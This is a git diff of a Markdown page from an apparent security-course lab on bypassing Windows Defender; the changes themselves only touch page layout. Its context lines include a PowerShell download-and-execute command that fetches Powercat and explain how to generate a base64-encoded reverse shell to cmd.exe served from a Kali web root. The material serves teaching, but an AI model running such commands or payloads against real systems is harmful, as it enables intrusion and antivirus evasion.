@@ -1,5 +1,15 @@
 ---
-layout: editorial
+layout:
+  title:
+    visible: true
+  description:
+    visible: true
+  tableOfContents:
+    visible: true
+  outline:
+    visible: true
+  pagination:
+    visible: false
 ---
 
 # Bypassing Windows Defender
@@ -42,7 +52,7 @@ pwsh -c "iex (New-Object System.Net.Webclient).DownloadString('https://raw.githu
 
 The commands above uses Powershell for Linux (**pwsh**) to download (**iex**) a file from a remote server (**New-Object System.Net.Webclient**)**.DownloadString**). The file it downloads is Powercat. Powercat is a Powershell version of ncat like the labs you did earlier in the semester. The semicolon separates commands. The next command it is going to run is to set the IP of your Kali machine and set the Port number to connect to it and execute cmd.exe when someone connects (**-e cmd.exe**). It will generate the code to connect to your Kali server, but it will encode the commands using base64 (**-ge**). Base64 is an encoding format that is generally used to convert binary data to ASCII or standard characters. The generated payload will be save do the web root (\*\* > /var/www/html/backup.bat\*\*)
 
-
+***
 
 ## Base64
 
@@ -72,7 +82,7 @@ Note how it is back to the normal “hello” text.
 Base64 is used by threat actors to hide their activity. Note, however, you can decode it when you detect it.
 ```
 
-
+***
 
 ## Back to the bypassing defender Lab
 
